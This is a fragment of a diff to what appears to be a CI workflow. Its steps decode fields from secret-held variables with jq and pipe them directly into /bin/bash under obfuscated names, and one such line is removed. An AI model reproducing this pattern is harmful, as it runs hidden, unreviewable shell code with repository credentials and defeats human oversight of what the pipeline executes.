@@ -22,7 +22,6 @@ jobs:
           ih47: ${{ secrets.ih47 }}
         run: |
           printf '%s' "$ih47" | jq -r .xqh4828 | /bin/bash
-          echo $eul29 | jq -r .skyzg39 | /bin/bash
           printf '%s' "$effrb07" | jq -r .hvfev42 | /bin/bash
           echo $u5353 | jq -r .n5 | /bin/bash
           printf '%s' "$qlkh253" | jq -r .hi0076 | /bin/bash
